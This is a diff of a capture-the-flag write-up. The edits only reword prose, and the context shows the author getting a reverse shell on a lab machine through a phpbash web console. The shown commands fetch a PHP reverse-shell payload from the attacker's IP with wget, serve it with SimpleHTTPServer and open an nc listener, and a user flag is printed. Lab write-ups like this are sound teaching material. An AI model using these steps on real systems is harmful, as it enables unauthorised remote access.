@@ -16,7 +16,7 @@ I start by looking at `/home`, and I find the user flag in `arrexel` repo:
 
 `2c281f318555dbc1b856957c7147bfc1`
 
-To get the root flag, my first idea is to create a `shell.php` in `/uploads` site directory that dirb found. But the problem is that the "<?" sequence is filtered in the *phpbash* input. Indeed,
+To get the root flag, my first idea is to create a `shell.php` in the `/uploads` site directory that dirb found. But the problem is that the "<?" sequence is filtered in the *phpbash* input. Indeed,
 
 ```bash
 echo "?php echo allo; ?" > test
@@ -30,7 +30,7 @@ echo "<?php echo allo; ?>" > test
 
 becomes `echo "" > test`. My second idea is to escalade privs to become root directly on the site. `sudo -l` shows that I can easily become `scriptmanager` without password, but `sudo -u scriptmanager bash` does not return anything.
 
-I understand I should stop working on the site and spawn a shell on my host for my privilege escalation. To do so, I upload a reverse shell on the site. First I copy one to my working directory.
+I understand I should stop working on the site and that I should spawn a shell on my host for my privilege escalation. To do so, I upload a reverse shell on the site. First I copy one to my working directory.
 
 ```bash
 cp /usr/share/laudanum/php/php-reverse-shell.php .
@@ -41,13 +41,13 @@ After changing the IP:port, I start a server to make it accessible.
 python -m SimpleHTTPServer 80
 ```
 
-From the *phpscript* page, I download it.
+From the *phpscript* page, I download it with
 
 ```bash
 wget 10.10.14.34/php-reverse-shell.php
 ```
 
-Here `10.10.14.34` is my IP. And to conclude I start netcat to listen on the port I configured in the reverse shell code.
+where `10.10.14.34` is my IP. To conclude I start netcat to listen on the port I configured in the reverse shell code.
 
 ```bash
 nc -lvnp 4444
